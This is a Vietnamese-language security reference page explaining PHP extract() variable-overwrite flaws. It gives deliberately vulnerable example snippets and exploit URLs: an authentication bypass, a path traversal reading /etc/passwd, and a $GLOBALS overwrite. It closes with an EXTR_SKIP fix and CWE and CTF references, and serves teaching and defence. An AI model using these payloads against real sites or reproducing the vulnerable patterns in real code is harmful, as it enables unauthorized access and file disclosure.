# External Variable Modification (Sửa Đổi Biến Bên Ngoài)
> Lỗ hổng External Variable Modification xảy ra khi một ứng dụng web xử lý đầu vào của người dùng không đúng cách, cho phép kẻ tấn công ghi đè lên các biến nội bộ. Trong PHP, các hàm như extract($_GET), extract($_POST), hoặc import_request_variables() có thể bị lợi dụng nếu chúng nhập dữ liệu do người dùng kiểm soát vào phạm vi toàn cục (global scope) mà không có kiểm tra hợp lệ đúng cách. Điều này có thể dẫn đến các vấn đề bảo mật như thay đổi trái phép logic ứng dụng, leo thang đặc quyền, hoặc vượt qua các cơ chế kiểm soát bảo mật.
## Tóm tắt
* [Phương pháp](#methodology)
    * [Ghi đè các biến quan trọng](#overwriting-critical-variables)
    * [Đầu độc File Inclusion](#poisoning-file-inclusion)
    * [Chèn biến toàn cục (Global Variable Injection)](#global-variable-injection)
* [Biện pháp khắc phục](#remediations)
* [Tài liệu tham khảo](#references)
## Phương pháp
Hàm `extract()` trong PHP nhập các biến từ một mảng vào bảng ký hiệu (symbol table) hiện tại. Mặc dù có vẻ tiện lợi, nó có thể gây ra những rủi ro bảo mật nghiêm trọng, đặc biệt khi xử lý dữ liệu do người dùng cung cấp.
* Nó cho phép ghi đè lên các biến đã tồn tại.
* Nó có thể dẫn đến **ô nhiễm biến** (variable pollution), ảnh hưởng đến các cơ chế bảo mật.
* Nó có thể được dùng như một **gadget** để kích hoạt các lỗ hổng khác như Remote Code Execution (RCE) và Local File Inclusion (LFI).
Mặc định, `extract()` sử dụng `EXTR_OVERWRITE`, nghĩa là nó **thay thế các biến đã tồn tại** nếu chúng có cùng tên với các khóa trong mảng đầu vào.
### Ghi đè các biến quan trọng
Nếu `extract()` được sử dụng trong một script phụ thuộc vào các biến cụ thể, kẻ tấn công có thể thao túng chúng.
```php
<?php
    $authenticated = false;
    extract($_GET);
    if ($authenticated) {
        echo "Access granted!";
    } else {
        echo "Access denied!";
    }
?>
```
**Khai thác:**
Trong ví dụ này, việc sử dụng `extract($_GET)` cho phép kẻ tấn công đặt biến `$authenticated` thành `true`:
```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```
### Đầu độc File Inclusion
Nếu `extract()` được kết hợp với file inclusion, kẻ tấn công có thể kiểm soát đường dẫn tệp.
```php
<?php
    $page = "config.php";
    extract($_GET);
    include "$page";
?>
```
**Khai thác:**
```ps1
http://example.com/vuln.php?page=../../etc/passwd
```
### Chèn biến toàn cục (Global Variable Injection)
:warning: Kể từ PHP 8.1.0, quyền ghi vào toàn bộ mảng `$GLOBALS` không còn được hỗ trợ nữa.
Ghi đè `$GLOBALS` khi một ứng dụng gọi hàm `extract` trên giá trị không đáng tin cậy:
```php
extract($_GET);
```
Kẻ tấn công có thể thao túng các **biến toàn cục**:
```ps1
http://example.com/vuln.php?GLOBALS[admin]=1
```
## Biện pháp khắc phục
Sử dụng `EXTR_SKIP` để ngăn chặn việc ghi đè:
```php
extract($_GET, EXTR_SKIP);
```
## Tài liệu tham khảo
* [CWE-473: PHP External Variable Modification - Common Weakness Enumeration - November 19, 2024](https://web.archive.org/web/20260210044429/https://cwe.mitre.org/data/definitions/473.html)
* [CWE-621: Variable Extraction Error - Common Weakness Enumeration - November 19, 2024](https://web.archive.org/web/20260223131419/https://cwe.mitre.org/data/definitions/621.html)
* [Function extract - PHP Documentation - March 21, 2001](https://web.archive.org/web/20260210044429/https://www.php.net/manual/en/function.extract.php)
* [$GLOBALS variables - PHP Documentation - April 30, 2008](https://web.archive.org/web/20260307071107/https://www.php.net/manual/en/reserved.variables.globals.php)
* [The Ducks - HackThisSite - December 14, 2016](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)
* [Extracttheflag! - Orel / WindTeam - February 28, 2024](https://web.archive.org/web/20250709004721/https://ctftime.org/writeup/38076)
